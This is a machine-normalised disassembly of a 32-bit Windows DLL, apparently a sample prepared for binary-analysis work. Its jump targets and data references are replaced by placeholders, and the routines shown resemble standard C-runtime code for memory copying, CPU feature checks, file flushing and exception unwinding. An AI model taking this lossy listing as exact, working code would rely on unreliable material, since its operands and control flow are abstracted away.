mov ecx [ rw-data ]
mov [ rw-data ] eax
cmp eax 0x3
jne r-xdata
mov ecx [ rw-data ]
jmp r-xdata
mov eax ecx
pop ebp
retn
sub_10006f9f
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ EncodePointer@IAT ]
push esi
push edi
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
xor edi edi
push edi
mov [ ebp - 0x20 ] eax
call ebx
mov esi eax
mov [ ebp - 0x18 ] esi
call sub_10004380
mov [ ebp - 0x14 ] eax
cmp [ rw-data ] edi
jne r-xdata
call [ IsDebuggerPresent@IAT ]
test eax eax
je r-xdata
push 0x800
push edi
push r--data
call [ LoadLibraryExW@IAT ]
mov esi eax
test esi esi
jne r-xdata
cmp [ ebp - 0x14 ] edi
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push r--data
push esi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x57
jne r-xdata
mov eax [ rw-data ]
mov ebx [ DecodePointer@IAT ]
cmp eax esi
je r-xdata
push [ rw-data ]
call [ DecodePointer@IAT ]
push 0x3
jmp r-xdata
cmp [ ebp - 0x14 ] edi
je r-xdata
push eax
call [ OutputDebugStringW@IAT ]
xor eax eax
push eax
call ebx
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
mov [ rw-data ] eax
test eax eax
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
cmp [ rw-data ] esi
je r-xdata
pop eax
jmp r-xdata
push 0x4
mov esi [ ebp - 0x18 ]
push r--data
push esi
call [ GetProcAddress@IAT ]
push eax
call ebx
mov [ rw-data ] eax
mov esi [ ebp + 0x10 ]
push eax
call ebx
test eax eax
je r-xdata
push eax
call ebx
push [ rw-data ]
mov [ ebp - 0x14 ] eax
call ebx
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10002de0
leave
retn
push esi
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push edi
call eax
jmp r-xdata
call eax
mov edi eax
test edi edi
je r-xdata
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
call ecx
test eax eax
je r-xdata
push eax
call ebx
test eax eax
je r-xdata
mov esi [ ebp + 0x10 ]
or esi 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call [ ebp - 0x18 ]
test eax eax
je r-xdata
push edi
call eax
mov edi eax
push [ rw-data ]
call ebx
test eax eax
je r-xdata
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_10007181
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_100057e9
mov [ eax ] 0x16
call sub_10005b17
or eax 0xffffffff
pop ebp
retn
sub_100071bb
call sub_10005e59
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_10005e82
pop ecx
push 0x3
call sub_100039e7
int3
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push 0x1
push 0x40000015
push 0x3
call sub_100059bc
add esp 0xc
push 0x7
pop ecx
int 0x29
sub_100071fe
push ebp
mov ebp esp
push ebx
push esi
push edi
xor edi edi
mov ebx 0xe3
mov eax [ esi * 8 + r--data ]
jns r-xdata
lea edi [ esi + 0x1 ]
lea ebx [ esi - 0x1 ]
jmp r-xdata
lea eax [ ebx + edi ]
cdq
sub eax edx
mov esi eax
sar esi 0x1
push 0x55
push [ esi * 8 + r--data ]
push [ ebp + 0x8 ]
call sub_100072c2
add esp 0xc
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp edi ebx
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000724c
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call sub_100071fe
pop ecx
test eax eax
js r-xdata
cmp eax 0xe4
jae r-xdata
mov eax [ eax * 8 + r--data ]
pop ebp
retn
sub_10007276
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000724c
pop ecx
push eax
call [ LCMapStringW@IAT ]
pop ebp
retn
xor ecx ecx
push ecx
push ecx
push ecx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_100072c2
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
xor eax eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ebx
push edi
mov edi [ ebp + 0x8 ]
push 0x41
pop ebx
push 0x5a
pop edx
sub edi ecx
mov [ ebp + 0x10 ] edx
jmp r-xdata
movzx eax [ edi + ecx ]
cmp ax bx
jb r-xdata
mov edx eax
cmp ax dx
ja r-xdata
add ecx 0x2
dec esi
je r-xdata
cmp ax [ ebp + 0x10 ]
ja r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
movzx ecx ax
movzx eax dx
pop edi
sub eax ecx
pop ebx
test dx dx
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax bx
jb r-xdata
cmp dx ax
je r-xdata
push 0x5a
pop edx
sub_10007330
push edi
push esi
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0xc ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
bt [ rw-data ] 0x1
jae r-xdata
cmp edi eax
jb r-xdata
cmp ecx 0x80
jb r-xdata
[ edi ] [ esi ]
jmp r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
test edi 0x3
jne r-xdata
mov eax edi
xor eax esi
test eax 0xf
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
bt [ rw-data ] 0x0
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
jmp [ ecx * 4 + jump_table_10007804 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10007708 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10007804 ]
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_1000757c ]
jmp [ ecx * 4 + jump_table_100075fc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10007668 ]
test edi 0x3
jne r-xdata
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10007804 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10007668 ]
mov al [ esi ]
mov [ edi ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
test esi 0x3
jne r-xdata
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10007804 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10007804 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10007804 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10007668 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10007668 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10007668 ]
bt edi 0x2
jae r-xdata
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
lea esp [ esp ]
nop
bt edi 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
test esi 0x7
je r-xdata
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
movdqa xmm1 [ esi - 0x8 ]
lea esi [ esi - 0x8 ]
lea ecx [ ecx ]
bt esi 0x3
jae r-xdata
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x8
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x8
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x8
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x8 ]
jmp r-xdata
movdqa xmm1 [ esi - 0x4 ]
lea esi [ esi - 0x4 ]
mov edi edi
movdqa xmm1 [ esi - 0xc ]
lea esi [ esi - 0xc ]
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
cmp ecx 0x10
jl r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x4
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x4
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x4
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x4 ]
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0xc
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0xc
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0xc
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0xc ]
jmp r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
bt ecx 0x2
jae r-xdata
movdqu xmm1 [ esi ]
sub ecx 0x10
lea esi [ esi + 0x10 ]
movdqa [ edi ] xmm1
lea edi [ edi + 0x10 ]
jmp r-xdata
lea ebx [ ebx ]
bt ecx 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
mov eax [ ecx * 4 + jump_table_10007668 ]
jmp eax
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
sub_10007974
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_100057e9
mov [ eax ] 0x16
call sub_10005b17
or eax 0xffffffff
pop ebp
retn
sub_10007998
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_100057e9
mov [ eax ] 0x9
jmp r-xdata
call sub_100057e9
mov [ eax ] 0x9
call sub_10005b17
cmp ecx [ rw-data ]
jae r-xdata
xor eax eax
pop ebp
retn
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
movsx eax [ eax + ecx + 0x4 ]
and eax 0x40
pop ebp
retn
sub_100079ec
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_10007a32
pop ecx
test eax eax
je r-xdata
push esi
call sub_10007a9f
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_10007974
push eax
call sub_10008085
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_10007a32
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov eax [ esi + 0xc ]
and al 0x3
cmp al 0x2
jne r-xdata
mov ecx [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] ecx
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test [ esi + 0xc ] 0x108
je r-xdata
push edi
mov edi [ esi ]
sub edi [ esi + 0x8 ]
test edi edi
jle r-xdata
pop edi
push edi
push [ esi + 0x8 ]
push esi
call sub_10007974
pop ecx
push eax
call sub_1000816b
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_10007a9f
push 0x14
push r--data
call sub_10004750
xor edi edi
mov [ ebp - 0x1c ] edi
and [ ebp - 0x24 ] edi
push 0x1
call sub_1000494d
pop ecx
and [ ebp - 0x4 ] edi
xor esi esi
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10007b7a
cmp ebx 0x1
mov eax edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
call sub_10004795
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_100062ab
pop ecx
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_10007b47
cmp ebx 0x1
jne r-xdata
test ebx ebx
jne r-xdata
push eax
call sub_100079ec
pop ecx
cmp eax 0xffffffff
je r-xdata
test [ eax + 0xc ] 0x2
je r-xdata
inc edi
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
call sub_100079ec
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_10007b90
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10007bb0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_10002de0
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_10007bf5
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_10007bf5
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_10007bb0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_10007ca5
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_10007cc4
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_10007ca5
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_10007cc7
push 0x10
push r--data
call sub_10004750
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_1000494d
pop ecx
and [ ebp - 0x4 ] edi
push 0x3
pop esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10007d5b
mov eax edi
call sub_10004795
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
inc esi
jmp r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
cmp esi 0x14
jl r-xdata
push eax
call sub_10008ae3
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_10003622
pop ecx
mov eax [ rw-data ]
and [ eax + esi * 4 ] 0x0
inc edi
mov [ ebp - 0x1c ] edi
sub_10007d64
push 0x8
push r--data
call sub_10004750
mov esi rw-data
cmp [ rw-data ] esi
je r-xdata
call sub_10004795
retn
push 0xc
call sub_1000494d
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push rw-data
call sub_10004dc7
pop ecx
pop ecx
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10007dad
sub_10007eb4
push ebp
mov ebp esp
and [ rw-data ] 0x0
sub esp 0x10
push ebx
xor ebx ebx
inc ebx
or [ rw-data ] ebx
push 0xa
call IsProcessorFeaturePresent
test eax eax
je r-xdata
xor eax eax
pop ebx
leave
retn
xor ecx ecx
mov eax ebx
mov [ rw-data ] ebx
cpuid
push esi
mov esi [ rw-data ]
push edi
lea edi [ ebp - 0x10 ]
or esi 0x2
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
test [ ebp - 0x8 ] 0x100000
mov [ rw-data ] esi
je r-xdata
test [ ebp - 0x8 ] __dos_header
je r-xdata
or esi 0x4
mov [ rw-data ] 0x2
mov [ rw-data ] esi
push 0x7
xor ecx ecx
pop eax
cpuid
lea esi [ ebp - 0x10 ]
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edx
test [ ebp - 0xc ] 0x200
mov esi [ rw-data ]
je r-xdata
or esi 0x8
mov [ rw-data ] 0x3
mov [ rw-data ] esi
xor eax eax
xor ecx ecx
cpuid
lea edi [ ebp - 0x10 ]
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
cmp [ ebp - 0xc ] 0x756e6547
jne r-xdata
or esi 0x2
mov [ rw-data ] esi
pop edi
pop esi
cmp [ ebp - 0x4 ] 0x49656e69
jne r-xdata
cmp [ ebp - 0x8 ] 0x6c65746e
jne r-xdata
xor eax eax
inc eax
xor ecx ecx
cpuid
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
mov eax [ ebp - 0x10 ]
and eax 0xfff3ff0
cmp eax 0x106c0
je r-xdata
or esi 0x1
mov [ rw-data ] esi
cmp eax 0x20660
je r-xdata
cmp eax 0x20670
je r-xdata
cmp eax 0x30650
je r-xdata
cmp eax 0x30660
je r-xdata
cmp eax 0x30670
jne r-xdata
sub_10007ff0
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_10008085
push 0x14
push r--data
call sub_10004750
mov edi [ ebp + 0x8 ]
cmp edi 0xfffffffe
jne r-xdata
test edi edi
js r-xdata
call sub_100057e9
mov [ eax ] 0x9
jmp r-xdata
call sub_100057e9
mov [ eax ] 0x9
call sub_10005b17
cmp edi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov eax edi
sar eax 0x5
mov [ ebp - 0x20 ] eax
mov ebx edi
and ebx 0x1f
shl ebx 0x6
mov eax [ eax * 4 + rw-data ]
movsx eax [ ebx + eax + 0x4 ]
and eax 0x1
je r-xdata
push edi
call sub_10008b8b
pop ecx
xor esi esi
mov [ ebp - 0x4 ] esi
mov eax [ ebp - 0x20 ]
mov eax [ eax * 4 + rw-data ]
test [ ebx + eax + 0x4 ] 0x1
je r-xdata
call sub_100057e9
mov [ eax ] 0x9
or esi 0xffffffff
mov [ ebp - 0x1c ] esi
push edi
call sub_10008c9d
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
call sub_10004795
retn
mov [ ebp - 0x1c ] esi
test esi esi
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000814a
mov eax esi
jmp r-xdata
call sub_100057b5
mov [ eax ] esi
sub_1000816b
push 0x10
push r--data
call sub_10004750
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_100057b5
and [ eax ] 0x0
call sub_100057e9
mov [ eax ] 0x9
jmp r-xdata
call sub_100057b5
and [ eax ] 0x0
call sub_100057e9
mov [ eax ] 0x9
call sub_10005b17
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
je r-xdata
push esi
call sub_10008b8b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_100057e9
mov [ eax ] 0x9
call sub_100057b5
and [ eax ] 0x0
or edi 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1000824d
